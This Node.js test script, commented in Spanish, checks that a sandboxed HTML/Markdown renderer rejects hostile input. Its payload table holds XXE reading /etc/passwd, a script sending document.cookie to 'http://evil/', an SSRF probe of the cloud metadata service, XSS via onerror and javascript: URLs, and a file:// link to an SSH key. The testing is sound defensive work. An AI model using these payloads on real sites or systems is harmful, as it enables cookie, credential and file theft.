/**
 * Prueba de que cada caso hace lo que dice.
 *
 * La regla del proyecto es que un caso no puede declararse `building` ni
 * `ready` sin una prueba que se ejecute aquí. Este script es esa prueba, y es
 * también el guardián de la regla: si un caso sube de estado y no aparece en
 * la tabla de abajo, la suite falla.
 *
 * Las pruebas son de comportamiento, no de forma: se le da al caso una entrada
 * hostil concreta y se comprueba qué hizo con ella.
 */
import { spawnSync } from "node:child_process";
import { readFile } from "node:fs/promises";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { CHECKS } from "./lib/case-checks.mjs";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const catalog = JSON.parse(await readFile(resolve(root, "sandbox.config.json"), "utf8"));

/**
 * Estados que obligan a tener prueba aquí. `planned` no promete nada y
 * `building` promete que se está construyendo; solo `ready` afirma que
 * funciona, y esa afirmación hay que sostenerla con una ejecución.
 */
const REQUIRE_PROOF = new Set(["ready"]);

const python = process.env.PYTHON ?? (process.platform === "win32" ? "python" : "python3");

function interpret(content) {
  const run = spawnSync(python, [resolve(root, "cases/01-untrusted-render/interpreter.py")], {
    input: content,
    encoding: "utf8",
    timeout: 15_000
  });
  if (run.status !== 0) throw new Error(`el intérprete terminó con ${run.status}: ${run.stderr}`);
  return JSON.parse(run.stdout);
}

/**
 * Cada entrada es: contenido hostil, qué rechazo debe aparecer, y qué NO puede
 * quedar en la salida. El «porqué» es el nombre de la prueba.
 */
const RENDER_ATTACKS = [
  {
    why: "una entidad externa en el DOCTYPE es XXE",
    content: '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><p>&x;</p>',
    expect: "entidad-externa",
    absent: ["/etc/passwd"]
  },
  {
    why: "un script no se escapa, se descarta con su contenido",
    content: '<script>fetch("http://evil/"+document.cookie)</script><p>ok</p>',
    expect: "etiqueta-descartada",
    absent: ["fetch", "document.cookie", "<script"]
  },
  {
    why: "pedir el servicio de metadatos de la nube es pedir credenciales",
    content: '<img src="http://169.254.169.254/latest/meta-data/iam/">',
    expect: "ssrf",
    absent: ["169.254.169.254"]
  },
  {
    why: "un atributo on* es código dentro de un atributo",
    content: '<img src="/a.png" onerror="alert(1)">',
    expect: "manejador-de-evento",
    absent: ["onerror", "alert"]
  },
  {
    why: "file:// no tiene sentido en contenido que llega de fuera",
    content: '<a href="file:///home/usuario/.ssh/id_rsa">mira</a>',
    expect: "acceso-a-fichero",
    absent: ["id_rsa"]
  },
  {
    why: "javascript: en una URL sigue siendo ejecución",
    content: '<a href="javascript:alert(1)">click</a>',
    expect: "script-en-url",
    absent: ["javascript:"]
  },
  {
    why: "un data: URI trae su propio contenido y se salta el origen",
    content: '<img src="data:text/html;base64,PHNjcmlwdD4x">',
    expect: "data-uri",
    absent: ["data:text/html"]
  },
  {
    why: "un enlace Markdown puede llevar el mismo esquema hostil",
    content: "[pincha aquí](javascript:alert(1))",
    expect: "enlace-markdown",
    absent: []
  },
  {
    why: "un documento sin fin es una denegación de servicio",
    content: "<p>x</p>".repeat(30_000),
    expect: "presupuesto",
    absent: []
  }
];

const CASES = {
  // Los casos 04 y 06–15 se comprueban llamando a su núcleo, que es un módulo
  // de Python puro. Sus comprobaciones viven en scripts/lib/case-checks.mjs.
  ...CHECKS,
  /** 01 — el intérprete no tiene capacidades, y lo que rechaza queda anotado. */
  "01": () => {
    const results = [];
    for (const attack of RENDER_ATTACKS) {
      const report = interpret(attack.content);
      const kinds = Object.keys(report.rejectionsByKind);
      if (!kinds.includes(attack.expect)) {
        throw new Error(`caso 01 · ${attack.why}\n  esperaba el rechazo "${attack.expect}", obtuve [${kinds.join(", ")}]`);
      }
      for (const forbidden of attack.absent) {
        if (report.safeHtml.includes(forbidden)) {
          throw new Error(`caso 01 · ${attack.why}\n  "${forbidden}" sobrevivió a la interpretación`);
        }
      }
      results.push(attack.why);
    }
    const capabilities = interpret("<p>hola</p>").capabilities;
    const granted = Object.entries(capabilities).filter(([, value]) => value);
    if (granted.length) throw new Error(`caso 01 · el intérprete declara capacidades concedidas: ${granted.map(([k]) => k).join(", ")}`);
    return [...results, "el intérprete no declara ninguna capacidad concedida"];
  }
};

let failures = 0;
const lines = [];

for (const kase of catalog.cases) {
  const proof = CASES[kase.id];
  if (!proof) {
    if (REQUIRE_PROOF.has(kase.status)) {
      lines.push(`  ✗ ${kase.id} ${kase.slug} — está en "${kase.status}" y no tiene prueba en scripts/verify-cases.mjs`);
      failures += 1;
    } else {
      lines.push(`  · ${kase.id} ${kase.slug} — "${kase.status}", todavía sin prueba de comportamiento aquí`);
    }
    continue;
  }
  try {
    const checks = proof();
    lines.push(`  ✓ ${kase.id} ${kase.slug} — ${checks.length} comprobaciones`);
    for (const check of checks) lines.push(`      ${check}`);
  } catch (error) {
    lines.push(`  ✗ ${kase.id} ${kase.slug}\n    ${error.message.replaceAll("\n", "\n    ")}`);
    failures += 1;
  }
}

console.log("Casos técnicos — prueba de comportamiento\n");
console.log(lines.join("\n"));

if (failures) {
  console.error(`\n${failures} caso(s) no pasaron.`);
  process.exit(1);
}
console.log("\nTodos los casos con estado comprometido demuestran lo que declaran.");
